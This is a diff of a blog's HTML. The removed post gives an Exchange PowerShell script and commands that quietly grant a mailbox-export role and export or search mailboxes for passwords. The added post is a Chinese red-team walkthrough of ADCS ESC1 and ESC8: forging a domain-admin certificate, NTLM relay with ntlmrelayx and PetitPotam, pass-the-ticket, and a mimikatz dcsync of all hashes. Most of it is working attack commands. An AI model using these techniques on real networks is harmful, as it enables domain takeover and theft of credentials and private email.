-		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$ConnectionUri</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$Filter</span>
-	<span class="token punctuation">)</span>
-    <span class="token variable">$Flag</span> = 0
-    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Import-PSSession"</span> 
-    <span class="token comment">#Import-PSSession</span>
-    <span class="token variable">$Pass</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token variable">$Password</span> <span class="token operator">-</span>Force
-    <span class="token variable">$Credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Pass</span>
-    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
-    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>
+CA                      : yangdc.yangsir.git\yangsir-YANGDC-CA
+Name                    : 用户 的副本
+SchemaVersion           : 2
+OID                     : 1.3.6.1.4.1.311.21.8.10154165.557338.9848748.4027908.13133259.250.6500742.4833607
+VulnerableTemplateACL   : False
+LowPrivCanEnroll        : True
+EnrolleeSuppliesSubject : True
+EnhancedKeyUsage        : 客户端身份验证 (1.3.6.1.5.5.7.3.2)|安全电子邮件 (1.3.6.1.5.5.7.3.4)|加密文件系统 (1.3.6.1.4.1.311.10.3.4)
+HasAuthenticationEku    : True
+HasDangerousEku         : False
+EnrollmentAgentTemplate : False
+CAManagerApproval       : False
+IssuanceRequirements    : [Issuance Requirements]
+                            Authorized signature count: 0
+                            Reenrollment requires: same criteria as for enrollment.
+ValidityPeriod          : 1 years
+RenewalPeriod           : 6 weeks
+Owner                   : YANGSIR\Administrator
+DACL                    : NT AUTHORITY\Authenticated Users (Allow) - Read, Enroll
+                          YANGSIR\Administrator (Allow) - Read, Write
+                          YANGSIR\Domain Admins (Allow) - Read, Write, Enroll
+                          YANGSIR\Domain Users (Allow) - Enroll
+                          YANGSIR\Enterprise Admins (Allow) - Read, Write, Enroll
+Misconfigurations       : ESC1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172202595.png"></p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">通过普通域用户申请证书，注意UPN需要为域管<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172150232.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172140403.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">确认申请成功如下，为administrator权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172131605.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">确认使用者信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172123019.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">导出证书
+certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172115476.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">此处通过凭证进行PTT出现失败，后推测可能是时间同步的问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172050369.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">对机器重启后，再次PTT即可成功，使用先前导出的凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172024825.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">确认凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171956871.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">确认可成功获取权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171943256.png"></p>
+<h2 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h2><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">网上很多了，PetitPotam进行NTLM中继到域管
 
-    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to check user"</span>
-    <span class="token comment">#check user</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">)</span> 
-    <span class="token punctuation">&#123;</span>
-    	<span class="token function">Write-Host</span> <span class="token string">"[!] The specified user already exists.No need to add it to the group"</span>
-	<span class="token variable">$Flag</span> = 1
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">else</span>
-    <span class="token punctuation">&#123;</span>
-    	<span class="token function">Write-Host</span> <span class="token string">"[+] Start to add user"</span> 
-    	<span class="token comment">#Add user</span>
-    	<span class="token function">New-ManagementRoleAssignment</span> –Role <span class="token string">"Mailbox Import Export"</span> –User <span class="token variable">$User</span><span class="token punctuation">|</span> <span class="token function">Out-Null</span>
-    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to reconnect"</span>
-    	<span class="token comment">#Reconnect</span>
-    	<span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
-    	<span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
-    	<span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
-    <span class="token comment">#Export mail and do not save the export request</span>
-    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token variable">$Filter</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
-    
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Flag</span> = 0<span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to remove user"</span>
-    	<span class="token comment">#Remove user</span>
-    	<span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token function">Remove-ManagementRoleAssignment</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span>
-    <span class="token punctuation">&#125;</span>
-    
-    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Remove-PSSession"</span>
-    <span class="token comment">#Remove PSSession</span>
-    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
-    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+在ADCS下通过管理员可选择安装的附加服务器角色支持多种基于HTTP的注册方法，如证书注册服务通过安装证书注册web服务，通过安装证书注册策略web服务角色&amp;证书注册策略web协同工作，然而此类http证书的注册接口都非常容易遭受NTLM中继
 
-<h3 id="Use-exchange-1"><a href="#Use-exchange-1" class="headerlink" title="Use exchange"></a>Use exchange</h3><h4 id="Export-special-user-1"><a href="#Export-special-user-1" class="headerlink" title="Export special user"></a>Export special user</h4><pre class="line-numbers language-none"><code class="language-none">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
-$User &#x3D; &quot;yangsir&quot;
-New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+使用NTLM中继，可以实现冒用目标用户，从而访问这些web页面，并根据用户和机器证书模板请求客户端身份验证码证书
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.18.png"></p>
-<h4 id="PS-AUTO-1"><a href="#PS-AUTO-1" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">same way <span class="token keyword">from</span> the 3gstudent
+默认情况下，证书注册服务、证书注册策略web服务、网络设备注册服务通过授权http头支持协商身份验证，支持kerberos及NTLM。所以攻击者可以在中继攻击时获得NTLM身份验证虚拟性
+默认情况下，不会启用https，但是https本身不能抵抗NTLM中继！！！只有当https&amp;通道绑定相结合的时候，才能保护HTTPS服务免遭NTLM中继，ADCS没有为IIS上的身份验证启用扩展保护，并不能启用通道绑定！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">function</span> DirectExportMailfromExchange
-<span class="token punctuation">&#123;</span>
-<span class="token comment">#Requires -Version 2.0</span>
-<span class="token comment">&lt;#
-.SYNOPSIS
-This script will export the mail(.pst) from the Exchange server.
-The script needs to be executed on the Exchange server.
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx
+开启监听
+python3 ntlmrelayx.py -t http://192.168.3.73/certsrv/certfnsh.asp -smb2support --adcs --template <span class="token string">'DomainController'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">PetitPotam强制用户进行身份验证
 
-Author: 3gstudent
+PetitPotam.exe  192.168.3.11  192.168.3.144 [监听ip、目标服务ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200115491.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">获得凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">rubeus进行ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200335385.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">凭证已经获取，可以直接冲dcsync
 
-.PARAMETER MailBox
-The mail you want to export.
-
-.PARAMETER ExportPath
-The export path of the mail.
- 
-.PARAMETER $Filter
-The search filter of the mail.
-
-.PARAMETER $Version
-The version of the Exhange.
-It can be 2007,2010,2013 and 2016.
-
-.EXAMPLE
-PS C:\> DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;" -Version 2013
-#></span>
- 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$Version</span>
-	<span class="token punctuation">)</span>
-
-    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to add PSSnapin"</span> 
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2007<span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>Admin<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2010<span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>E2010<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">else</span>
-    <span class="token punctuation">&#123;</span>
-        
-        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>SnapIn<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  
-    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
-    <span class="token comment">#Export mail and do not save the export request</span>
-    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token punctuation">&#123;</span><span class="token punctuation">(</span>body <span class="token operator">-like</span> <span class="token string">"*pass*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
-    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><h3 id="PSSession-2"><a href="#PSSession-2" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">the same way to export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.22.png"></p>
-<h3 id="Use-exchange-2"><a href="#Use-exchange-2" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">all tar to find the key
-Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnly
-
-all tar to find the key to export tar user dir
-Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress
-
-tar user to find the key to export tar user dir
-Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="ECP"><a href="#ECP" class="headerlink" title="ECP"></a>ECP</h3><pre class="line-numbers language-none"><code class="language-none">let tar user into the Discovery Management group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.35.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">then go to this module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.39.png"></p>
+lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200719283.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">wmic执行命令即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816201949460.png"></p>
 
                 
             </div>
@@ -799,7 +715,7 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/">https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/</a>
+                    <a href="https://yangsirrr.github.io/2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/">https://yangsirrr.github.io/2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -837,24 +753,28 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/Domain-environment/">
+                                    <span class="chip bg-color">Domain environment</span>
+                                </a>
+                            
                                 <a href="/tags/Redteam/">
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Exchange/">
-                                    <span class="chip bg-color">Exchange</span>
+                                <a href="/tags/ADCS/">
+                                    <span class="chip bg-color">ADCS</span>
                                 </a>
                             
-                                <a href="/tags/Information-collection/">
-                                    <span class="chip bg-color">Information collection</span>
+                                <a href="/tags/ESC1/">
+                                    <span class="chip bg-color">ESC1</span>
                                 </a>
                             
-                                <a href="/tags/Export-Email/">
-                                    <span class="chip bg-color">Export Email</span>
+                                <a href="/tags/ESC8/">
+                                    <span class="chip bg-color">ESC8</span>
                                 </a>
                             
-                                <a href="/tags/Search-Email/">
-                                    <span class="chip bg-color">Search Email</span>
+                                <a href="/tags/PTT/">
+                                    <span class="chip bg-color">PTT</span>
                                 </a>
                             
                         </div>
@@ -900,16 +820,17 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/31/powershell-bypass-catch-password/">
+                <a href="/2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png" class="responsive-img" alt="Powershell bypass catch password">
+                        <img src="/(https:/raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS&ESC1&ESC8Attack/image-20210816200335385.png" class="responsive-img" alt="ADCS&amp;ESC1&amp;ESC8攻击方式">
                         
-                        <span class="card-title">Powershell bypass catch password</span>
+                        <span class="card-title">ADCS&amp;ESC1&amp;ESC8攻击方式</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -919,9 +840,9 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -934,27 +855,32 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
+                    
+                    <a href="/tags/Domain-environment/">
+                        <span class="chip bg-color">Domain environment</span>
+                    </a>
                     
                     <a href="/tags/Redteam/">
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
+                    <a href="/tags/ADCS/">
+                        <span class="chip bg-color">ADCS</span>
                     </a>
                     
-                    <a href="/tags/Powershell/">
-                        <span class="chip bg-color">Powershell</span>
+                    <a href="/tags/ESC1/">
+                        <span class="chip bg-color">ESC1</span>
                     </a>
                     
-                    <a href="/tags/Mimikatz/">
-                        <span class="chip bg-color">Mimikatz</span>
+                    <a href="/tags/ESC8/">
+                        <span class="chip bg-color">ESC8</span>
                     </a>
                     
-                    <a href="/tags/Catch-Password/">
-                        <span class="chip bg-color">Catch Password</span>
+                    <a href="/tags/PTT/">
+                        <span class="chip bg-color">PTT</span>
                     </a>
                     
                 </div>
@@ -968,12 +894,12 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/29/exchange-rce-methods/">
+                <a href="/2021/08/11/powershell-bypass-tips/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png" class="responsive-img" alt="Exchange RCE methods">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151247591.png" class="responsive-img" alt="Powershell bypass tips">
                         
-                        <span class="card-title">Exchange RCE methods</span>
+                        <span class="card-title">Powershell bypass tips</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -984,7 +910,7 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-11
                             </span>
                         <span class="publish-author">
                             
@@ -1005,24 +931,20 @@ Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox 
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Exchange/">
-                        <span class="chip bg-color">Exchange</span>
-                    </a>
-                    
                     <a href="/tags/RCE/">
                         <span class="chip bg-color">RCE</span>
                     </a>
                     
-                    <a href="/tags/CVE-2020-17144/">
-                        <span class="chip bg-color">CVE-2020-17144</span>
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
                     </a>
                     
-                    <a href="/tags/CVE-2020-16875/">
-                        <span class="chip bg-color">CVE-2020-16875</span>
+                    <a href="/tags/Cobaltstrike/">
+                        <span class="chip bg-color">Cobaltstrike</span>
                     </a>
                     
-                    <a href="/tags/CVE-2020-0688/">
-                        <span class="chip bg-color">CVE-2020-0688</span>
+                    <a href="/tags/Powershell/">
+                        <span class="chip bg-color">Powershell</span>
                     </a>
                     
                 </div>
